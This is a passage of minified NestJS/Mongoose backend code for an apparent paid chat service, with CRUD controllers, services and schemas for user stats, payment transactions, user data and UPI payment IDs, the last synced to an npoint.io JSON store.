this.statService.deleteAll()}};t.StatController=d,i([(0,a.Post)(),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[l.CreateStatDto]),r("design:returntype",Promise)],d.prototype,"create",null),i([(0,a.Get)(":chatId/:profile"),n(0,(0,a.Param)("chatId")),n(1,(0,a.Param)("profile")),r("design:type",Function),r("design:paramtypes",[String,String]),r("design:returntype",Promise)],d.prototype,"findByChatIdAndProfile",null),i([(0,a.Put)(":chatId/:profile"),n(0,(0,a.Param)("chatId")),n(1,(0,a.Param)("profile")),n(2,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[String,String,p.UpdateStatDto]),r("design:returntype",Promise)],d.prototype,"update",null),i([(0,a.Delete)(":chatId/:profile"),n(0,(0,a.Param)("chatId")),n(1,(0,a.Param)("profile")),r("design:type",Function),r("design:paramtypes",[String,String]),r("design:returntype",Promise)],d.prototype,"deleteOne",null),i([(0,a.Delete)(),r("design:type",Function),r("design:paramtypes",[]),r("design:returntype",Promise)],d.prototype,"deleteAll",null),t.StatController=d=i([(0,s.ApiTags)("stats"),(0,a.Controller)("stats"),r("design:paramtypes",[c.StatService])],d)},4181:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.StatModule=void 0;const r=o(3563),n=o(5839),a=o(2790),s=o(8890),c=o(8126),l=o(5774);let p=class{};t.StatModule=p,t.StatModule=p=i([(0,r.Module)({imports:[l.initModule,n.MongooseModule.forFeature([{name:"StatsModule",collection:"stats",schema:c.StatSchema}])],controllers:[s.StatController],providers:[a.StatService],exports:[a.StatService]})],p)},8126:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.StatSchema=t.Stat=void 0;const n=o(5839),a=o(9742);let s=class{};t.Stat=s,i([(0,a.ApiProperty)({example:"6785668464",description:"Chat ID"}),(0,n.Prop)({required:!0}),r("design:type",String)],s.prototype,"chatId",void 0),i([(0,a.ApiProperty)({example:12,description:"Count"}),(0,n.Prop)({required:!0}),r("design:type",Number)],s.prototype,"count",void 0),i([(0,a.ApiProperty)({example:50,description:"Pay Amount"}),(0,n.Prop)({required:!0}),r("design:type",Number)],s.prototype,"payAmount",void 0),i([(0,a.ApiProperty)({example:!0,description:"Demo Given"}),(0,n.Prop)({required:!0}),r("design:type",Boolean)],s.prototype,"demoGiven",void 0),i([(0,a.ApiProperty)({example:!0,description:"Demo Given Today"}),(0,n.Prop)({required:!0}),r("design:type",Boolean)],s.prototype,"demoGivenToday",void 0),i([(0,a.ApiProperty)({example:!1,description:"New User"}),(0,n.Prop)({required:!0}),r("design:type",Boolean)],s.prototype,"newUser",void 0),i([(0,a.ApiProperty)({example:!0,description:"Paid Reply"}),(0,n.Prop)({required:!0}),r("design:type",Boolean)],s.prototype,"paidReply",void 0),i([(0,a.ApiProperty)({example:"Amaan Khan",description:"Name"}),(0,n.Prop)({required:!0}),r("design:type",String)],s.prototype,"name",void 0),i([(0,a.ApiProperty)({example:!1,description:"Second Show"}),(0,n.Prop)({required:!0}),r("design:type",Boolean)],s.prototype,"secondShow",void 0),i([(0,a.ApiProperty)({example:null,description:"Did Pay"}),(0,n.Prop)({required:!1}),r("design:type",Boolean)],s.prototype,"didPay",void 0),i([(0,a.ApiProperty)({example:"shruthi1",description:"Client"}),(0,n.Prop)({required:!0}),r("design:type",String)],s.prototype,"client",void 0),i([(0,a.ApiProperty)({example:"shruthi",description:"Profile"}),(0,n.Prop)({required:!0}),r("design:type",String)],s.prototype,"profile",void 0),t.Stat=s=i([(0,n.Schema)()],s),t.StatSchema=n.SchemaFactory.createForClass(s),t.StatSchema.index({chatId:1,profile:1,client:1},{unique:!0})},2790:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.StatService=void 0;const a=o(3563),s=o(5839),c=o(6037);let l=class{constructor(e){this.statModel=e}async create(e){return new this.statModel(e).save()}async findAll(){return await this.statModel.find().exec()}async findByChatIdAndProfile(e,t){const o=await this.statModel.findOne({chatId:e,profile:t}).exec();if(!o)throw new a.NotFoundException(`Stat not found for chatId ${e} and profile ${t}`);return o}async update(e,t,o){const i=await this.statModel.findOneAndUpdate({chatId:e,profile:t},o,{new:!0}).exec();if(!i)throw new a.NotFoundException(`Stat not found for chatId ${e} and profile ${t}`);return i}async deleteOne(e,t){if(0===(await this.statModel.deleteOne({chatId:e,profile:t}).exec()).deletedCount)throw new a.NotFoundException(`Stat not found for chatId ${e} and profile ${t}`)}async deleteAll(){await this.statModel.deleteMany({}).exec()}};t.StatService=l,t.StatService=l=i([(0,a.Injectable)(),n(0,(0,s.InjectModel)("StatsModule")),r("design:paramtypes",[c.Model])],l)},7180:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateStatDto=void 0;const i=o(9742),r=o(3255);class n extends((0,i.PartialType)(r.CreateStatDto)){}t.UpdateStatDto=n},2455:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateTransactionDto=void 0;const n=o(9742);class a{}t.CreateTransactionDto=a,i([(0,n.ApiProperty)({description:"Unique transaction ID (UTR)."}),r("design:type",String)],a.prototype,"transactionId",void 0),i([(0,n.ApiProperty)({description:"Amount involved in the transaction."}),r("design:type",Number)],a.prototype,"amount",void 0),i([(0,n.ApiProperty)({description:"Issue type reported by the user."}),r("design:type",String)],a.prototype,"issue",void 0),i([(0,n.ApiProperty)({description:"Description of issue reported by the user."}),r("design:type",String)],a.prototype,"description",void 0),i([(0,n.ApiProperty)({description:"Refund method selected by the user."}),r("design:type",String)],a.prototype,"refundMethod",void 0),i([(0,n.ApiProperty)({description:"User profile ID."}),r("design:type",String)],a.prototype,"profile",void 0),i([(0,n.ApiProperty)({description:"User chat ID."}),r("design:type",String)],a.prototype,"chatId",void 0),i([(0,n.ApiProperty)({description:"IP address of the user."}),r("design:type",String)],a.prototype,"ip",void 0)},470:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateTransactionDto=void 0;const i=o(9742),r=o(2455);class n extends((0,i.PartialType)(r.CreateTransactionDto)){}t.UpdateTransactionDto=n},2763:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.TransactionSchema=t.Transaction=void 0;const n=o(5839),a=o(6037);let s=class extends a.Document{};t.Transaction=s,i([(0,n.Prop)({required:!1}),r("design:type",String)],s.prototype,"transactionId",void 0),i([(0,n.Prop)({required:!1}),r("design:type",Number)],s.prototype,"amount",void 0),i([(0,n.Prop)({required:!1}),r("design:type",String)],s.prototype,"issue",void 0),i([(0,n.Prop)({required:!1}),r("design:type",String)],s.prototype,"description",void 0),i([(0,n.Prop)(),r("design:type",String)],s.prototype,"refundMethod",void 0),i([(0,n.Prop)({required:!1}),r("design:type",String)],s.prototype,"profile",void 0),i([(0,n.Prop)({required:!1}),r("design:type",String)],s.prototype,"chatId",void 0),i([(0,n.Prop)({required:!1}),r("design:type",String)],s.prototype,"ipAddress",void 0),t.Transaction=s=i([(0,n.Schema)({timestamps:!0})],s),t.TransactionSchema=n.SchemaFactory.createForClass(s)},8861:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.TransactionController=void 0;const a=o(3563),s=o(9742),c=o(2455),l=o(470),p=o(2630);let d=class{constructor(e){this.transactionService=e}async create(e){return this.transactionService.create(e)}async findOne(e){return this.transactionService.findOne(e)}async findAll(e,t,o){return this.transactionService.findAll(e,t,o)}async update(e,t){return this.transactionService.update(e,t)}async delete(e){return this.transactionService.delete(e)}};t.TransactionController=d,i([(0,a.Post)(),(0,s.ApiOperation)({summary:"Create a new transaction"}),(0,s.ApiResponse)({status:201,description:"Transaction created successfully."}),(0,s.ApiResponse)({status:400,description:"Invalid input."}),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[c.CreateTransactionDto]),r("design:returntype",Promise)],d.prototype,"create",null),i([(0,a.Get)(":id"),(0,s.ApiOperation)({summary:"Get transaction by ID"}),(0,s.ApiResponse)({status:200,description:"Transaction retrieved successfully."}),(0,s.ApiResponse)({status:404,description:"Transaction not found."}),n(0,(0,a.Param)("id")),r("design:type",Function),r("design:paramtypes",[String]),r("design:returntype",Promise)],d.prototype,"findOne",null),i([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get all transactions or search transactions"}),(0,s.ApiResponse)({status:200,description:"Transactions retrieved successfully."}),n(0,(0,a.Query)("search")),n(1,(0,a.Query)("limit")),n(2,(0,a.Query)("offset")),r("design:type",Function),r("design:paramtypes",[String,Number,Number]),r("design:returntype",Promise)],d.prototype,"findAll",null),i([(0,a.Put)(":id"),(0,s.ApiOperation)({summary:"Update a transaction by ID"}),(0,s.ApiResponse)({status:200,description:"Transaction updated successfully."}),(0,s.ApiResponse)({status:404,description:"Transaction not found."}),n(0,(0,a.Param)("id")),n(1,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[String,l.UpdateTransactionDto]),r("design:returntype",Promise)],d.prototype,"update",null),i([(0,a.Delete)(":id"),(0,s.ApiOperation)({summary:"Delete a transaction by ID"}),(0,s.ApiResponse)({status:200,description:"Transaction deleted successfully."}),(0,s.ApiResponse)({status:404,description:"Transaction not found."}),n(0,(0,a.Param)("id")),r("design:type",Function),r("design:paramtypes",[String]),r("design:returntype",Promise)],d.prototype,"delete",null),t.TransactionController=d=i([(0,s.ApiTags)("Transactions"),(0,a.Controller)("transactions"),r("design:paramtypes",[p.TransactionService])],d)},9605:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.TransactionModule=void 0;const r=o(3563),n=o(5839),a=o(2630),s=o(8861),c=o(2763);let l=class{};t.TransactionModule=l,t.TransactionModule=l=i([(0,r.Module)({imports:[n.MongooseModule.forFeature([{name:c.Transaction.name,schema:c.TransactionSchema}])],controllers:[s.TransactionController],providers:[a.TransactionService],exports:[a.TransactionService]})],l)},2630:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.TransactionService=void 0;const a=o(3563),s=o(5839),c=o(6037),l=o(2763);let p=class{constructor(e){this.transactionModel=e}async create(e){const t=new this.transactionModel(e);return await t.save()}async findOne(e){const t=await this.transactionModel.findById(e).exec();if(!t)throw new a.NotFoundException("Transaction not found");return t}async findAll(e,t=10,o=0){const i=e?{$or:[{transactionId:{$regex:e,$options:"i"}},{issue:{$regex:e,$options:"i"}},{profile:{$regex:e,$options:"i"}},{chatId:{$regex:e,$options:"i"}}]}:{};return{transactions:await this.transactionModel.find(i).skip(o).limit(t).exec(),total:await this.transactionModel.countDocuments(i).exec()}}async update(e,t){const o=await this.transactionModel.findByIdAndUpdate(e,t,{new:!0}).exec();if(!o)throw new a.NotFoundException("Transaction not found");return o}async delete(e){const t=await this.transactionModel.findByIdAndDelete(e).exec();if(!t)throw new a.NotFoundException("Transaction not found");return t}};t.TransactionService=p,t.TransactionService=p=i([(0,a.Injectable)(),n(0,(0,s.InjectModel)(l.Transaction.name)),r("design:paramtypes",[c.Model])],p)},4890:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.UpiIdController=void 0;const a=o(3563),s=o(9742),c=o(7579);let l=class{constructor(e){this.UpiIdService=e}async findOne(){return this.UpiIdService.findOne()}async update(e){return this.UpiIdService.update(e)}};t.UpiIdController=l,i([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get Upi Ids"}),r("design:type",Function),r("design:paramtypes",[]),r("design:returntype",Promise)],l.prototype,"findOne",null),i([(0,a.Patch)(),(0,s.ApiOperation)({summary:"Update Upi Ids"}),(0,s.ApiBody)({type:Object}),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[Object]),r("design:returntype",Promise)],l.prototype,"update",null),t.UpiIdController=l=i([(0,s.ApiTags)("UPI Ids"),(0,a.Controller)("upi-ids"),r("design:paramtypes",[c.UpiIdService])],l)},7106:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.UpiIdModule=void 0;const r=o(3563),n=o(5839),a=o(7579),s=o(4890),c=o(5793),l=o(889);let p=class{};t.UpiIdModule=p,t.UpiIdModule=p=i([(0,r.Global)(),(0,r.Module)({imports:[p,l.NpointModule,n.MongooseModule.forFeature([{name:"UpiIdModule",collection:"upi-ids",schema:c.UpiIdSchema}])],providers:[a.UpiIdService],controllers:[s.UpiIdController],exports:[a.UpiIdService]})],p)},5793:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.UpiIdSchema=t.UpiId=void 0;const n=o(5839),a=r(o(6037));let s=class{};t.UpiId=s,t.UpiId=s=i([(0,n.Schema)({versionKey:!1,autoIndex:!0,strict:!1,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],s),t.UpiIdSchema=n.SchemaFactory.createForClass(s),t.UpiIdSchema.add({type:a.default.Schema.Types.Mixed})},7579:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}},a=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.UpiIdService=void 0;const s=o(3563),c=o(5839),l=o(6037),p=a(o(8938)),d=o(6185),u=o(6954);let f=class{constructor(e,t){this.UpiIdModel=e,this.npointSerive=t,this.upiIds={},this.UpiIdModel.findOne({}).exec().then((e=>{this.upiIds=e,console.log("Refreshed UPIs")})),setInterval((async()=>{await this.refreshUPIs(),await this.checkNpoint()}),3e5)}async OnModuleInit(){console.log("Config Module Inited")}async refreshUPIs(){console.log("Refreshed UPIs"),this.upiIds=await this.UpiIdModel.findOne({}).exec()}async checkNpoint(){const e=(await p.default.get("https://api.npoint.io/54baf762fd873c55c6b1")).data,t=await this.findOne();(0,d.areJsonsNotSame)(e,t)&&await this.npointSerive.updateDocument("54baf762fd873c55c6b1",this.upiIds)}async findOne(){if(Object.keys(this.upiIds).length>0)return this.upiIds;const e=await this.UpiIdModel.findOne({}).exec();return this.upiIds=e,console.log("Refreshed UPIs"),e}async update(e){delete e._id;const t=await this.UpiIdModel.findOneAndUpdate({},{$set:{...e}},{new:!0,upsert:!0}).exec();if(this.upiIds=t,console.log("Refreshed UPIs"),!t)throw new s.NotFoundException("UpiIdModel not found");return t}};t.UpiIdService=f,t.UpiIdService=f=i([(0,s.Injectable)(),n(0,(0,c.InjectModel)("UpiIdModule")),r("design:paramtypes",[l.Model,u.NpointService])],f)},2932:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateUserDataDto=void 0;const n=o(9742);class a{}t.CreateUserDataDto=a,i([(0,n.ApiProperty)({example:"5787751360",description:"Chat ID"}),r("design:type",String)],a.prototype,"chatId",void 0),i([(0,n.ApiProperty)({example:1,description:"Total count"}),r("design:type",Number)],a.prototype,"totalCount",void 0),i([(0,n.ApiProperty)({example:0,description:"Picture count"}),r("design:type",Number)],a.prototype,"picCount",void 0),i([(0,n.ApiProperty)({example:1718802722566,description:"Last message timestamp"}),r("design:type",Number)],a.prototype,"lastMsgTimeStamp",void 0),i([(0,n.ApiProperty)({example:1718802742567,description:"Limit time"}),r("design:type",Number)],a.prototype,"limitTime",void 0),i([(0,n.ApiProperty)({example:0,description:"Paid count"}),r("design:type",Number)],a.prototype,"paidCount",void 0),i([(0,n.ApiProperty)({example:0,description:"Profile count"}),r("design:type",Number)],a.prototype,"prfCount",void 0),i([(0,n.ApiProperty)({example:1,description:"Can reply"}),r("design:type",Number)],a.prototype,"canReply",void 0),i([(0,n.ApiProperty)({example:0,description:"Pay amount"}),r("design:type",Number)],a.prototype,"payAmount",void 0),i([(0,n.ApiProperty)({example:0,description:"highestPayAmount"}),r("design:type",Number)],a.prototype,"highestPayAmount",void 0),i([(0,n.ApiProperty)({example:0,description:"cheatCount",default:0}),r("design:type",Number)],a.prototype,"cheatCount",void 0),i([(0,n.ApiProperty)({example:0,description:"callTime",default:0}),r("design:type",Number)],a.prototype,"callTime",void 0),i([(0,n.ApiProperty)({example:"  ",description:"Username"}),r("design:type",String)],a.prototype,"username",void 0),i([(0,n.ApiProperty)({example:"-7250939091939055173",description:"Access hash"}),r("design:type",String)],a.prototype,"accessHash",void 0),i([(0,n.ApiProperty)({example:!0,description:"Paid reply status"}),r("design:type",Boolean)],a.prototype,"paidReply",void 0),i([(0,n.ApiProperty)({example:!1,description:"Demo given status"}),r("design:type",Boolean)],a.prototype,"demoGiven",void 0),i([(0,n.ApiProperty)({example:!1,description:"Second show status"}),r("design:type",Boolean)],a.prototype,"secondShow",void 0),i([(0,n.ApiProperty)({example:"sneha",description:"Profile name"}),r("design:type",String)],a.prototype,"profile",void 0),i([(0,n.ApiProperty)({example:!1,description:"Pics Sent status"}),r("design:type",Boolean)],a.prototype,"picsSent",void 0),i([(0,n.ApiProperty)({example:[],description:"videos"}),r("design:type",Array)],a.prototype,"videos",void 0)},2256:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.SearchDto=void 0;const n=o(9742),a=o(4922);class s{}t.SearchDto=s,i([(0,n.ApiPropertyOptional)({description:"Total count",type:Number}),r("design:type",Number)],s.prototype,"totalCount",void 0),i([(0,n.ApiPropertyOptional)({description:"Picture count",type:Number}),r("design:type",Number)],s.prototype,"picCount",void 0),i([(0,n.ApiPropertyOptional)({description:"Last message timestamp",type:Number}),r("design:type",Number)],s.prototype,"lastMsgTimeStamp",void 0),i([(0,n.ApiPropertyOptional)({description:"Limit time",type:Number}),r("design:type",Number)],s.prototype,"limitTime",void 0),i([(0,n.ApiPropertyOptional)({description:"Paid count",type:Number}),r("design:type",Number)],s.prototype,"paidCount",void 0),i([(0,n.ApiPropertyOptional)({description:"Profile count",type:Number}),r("design:type",Number)],s.prototype,"prfCount",void 0),i([(0,n.ApiPropertyOptional)({description:"Can reply",type:Number}),r("design:type",Number)],s.prototype,"canReply",void 0),i([(0,n.ApiPropertyOptional)({description:"Pay amount",type:Number}),r("design:type",Number)],s.prototype,"payAmount",void 0),i([(0,n.ApiPropertyOptional)({description:"Username"}),r("design:type",String)],s.prototype,"username",void 0),i([(0,n.ApiPropertyOptional)({description:"Access hash"}),r("design:type",String)],s.prototype,"accessHash",void 0),i([(0,n.ApiPropertyOptional)({description:"Paid reply status",type:Boolean}),r("design:type",Boolean)],s.prototype,"paidReply",void 0),i([(0,n.ApiPropertyOptional)({description:"Demo given status",type:Boolean}),r("design:type",Boolean)],s.prototype,"demoGiven",void 0),i([(0,n.ApiPropertyOptional)({description:"Second show status",type:Boolean}),r("design:type",Boolean)],s.prototype,"secondShow",void 0),i([(0,n.ApiPropertyOptional)({description:"Profile name"}),(0,a.Transform)((({value:e})=>e?.trim().toLowerCase())),r("design:type",String)],s.prototype,"profile",void 0),i([(0,n.ApiPropertyOptional)({description:"Chat ID"}),r("design:type",String)],s.prototype,"chatId",void 0),i([(0,n.ApiPropertyOptional)({description:"Pics Sent status"}),r("design:type",Boolean)],s.prototype,"picsSent",void 0)},4241:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateUserDataDto=void 0;const i=o(9742),r=o(2932);class n extends((0,i.PartialType)(r.CreateUserDataDto)){}t.UpdateUserDataDto=n},3664:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.UserDataSchema=t.UserData=void 0;const n=o(5839);let a=class{};t.UserData=a,i([(0,n.Prop)({required:!0}),r("design:type",String)],a.prototype,"chatId",void 0),i([(0,n.Prop)({required:!0}),r("design:type",Number)],a.prototype,"totalCount",void 0),i([(0,n.Prop)({required:!0}),r("design:type",Number)],a.prototype,"picCount",void 0),i([(0,n.Prop)({required:!0}),r("design:type",Number)],a.prototype,"lastMsgTimeStamp",void 0),i([(0,n.Prop)({required:!0}),r("design:type",Number)],a.prototype,"limitTime",void 0),i([(0,n.Prop)({required:!0}),r("design:type",Number)],a.prototype,"paidCount",void 0),i([(0,n.Prop)({required:!0}),r("design:type",Number)],a.prototype,"prfCount",void 0),i([(0,n.Prop)({required:!0}),r("design:type",Number)],a.prototype,"canReply",void 0),i([(0,n.Prop)({required:!0}),r("design:type",Number)],a.prototype,"payAmount",void 0),i([(0,n.Prop)({required:!0}),r("design:type",String)],a.prototype,"username",void 0),i([(0,n.Prop)({required:!0}),r("design:type",String)],a.prototype,"accessHash",void 0),i([(0,n.Prop)({required:!0}),r("design:type",Boolean)],a.prototype,"paidReply",void 0),i([(0,n.Prop)({required:!0}),r("design:type",Boolean)],a.prototype,"demoGiven",void 0),i([(0,n.Prop)({required:!0}),r("design:type",Boolean)],a.prototype,"secondShow",void 0),i([(0,n.Prop)({required:!0,default:0}),r("design:type",Number)],a.prototype,"fullShow",void 0),i([(0,n.Prop)({required:!0}),r("design:type",String)],a.prototype,"profile",void 0),i([(0,n.Prop)({required:!0}),r("design:type",Boolean)],a.prototype,"picSent",void 0),i([(0,n.Prop)({required:!0}),r("design:type",Number)],a.prototype,"highestPayAmount",void 0),i([(0,n.Prop)({required:!0}),r("design:type",Number)],a.prototype,"cheatCount",void 0),i([(0,n.Prop)({required:!0}),r("design:type",Number)],a.prototype,"callTime",void 0),i([(0,n.Prop)({required:!1,default:[]}),r("design:type",Array)],a.prototype,"videos",void 0),t.UserData=a=i([(0,n.Schema)({collection:"userData",versionKey:!1,autoIndex:!0,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],a),t.UserDataSchema=n.SchemaFactory.createForClass(a)},430:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return 